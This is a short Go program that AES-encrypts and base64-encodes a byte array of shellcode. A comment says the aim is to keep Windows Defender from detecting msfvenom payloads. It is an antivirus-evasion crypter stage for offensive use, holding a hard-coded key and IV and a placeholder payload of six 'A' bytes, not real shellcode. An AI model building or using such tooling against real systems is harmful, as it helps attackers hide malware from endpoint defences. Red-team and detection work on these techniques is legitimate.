package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
)

// Any key and IV param combination for AES-128 will do,
// this step is only to avoid Win Defender from detecting msfvenom tags
var key = []byte("supersecretkey12")
var iv = []byte("16byteivstring12")

func encryptShellcode(plainText []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := aes.BlockSize
	paddedPlainText := pad(plainText, blockSize)

	mode := cipher.NewCBCEncrypter(block, iv)

	cipherText := make([]byte, len(paddedPlainText))
	mode.CryptBlocks(cipherText, paddedPlainText)

	encodedCipherText := make([]byte, base64.StdEncoding.EncodedLen(len(cipherText)))
	base64.StdEncoding.Encode(encodedCipherText, cipherText)

	return encodedCipherText, nil
}

func pad(input []byte, blockSize int) []byte {
	padLen := blockSize - (len(input) % blockSize)
	padding := bytes.Repeat([]byte{byte(padLen)}, padLen)
	return append(input, padding...)
}

func main() {
	encryptedCyphertext, err := encryptShellcode(payload);
	if err != nil {
		fmt.Printf("[-] An error occured: %s", err.Error())
	}

	fmt.Println("[+] Encrypted payload >> ", string(encryptedCyphertext))
}

// msfvenom-generated payload
var payload = []byte("\x41\x41\x41\x41\x41\x41")
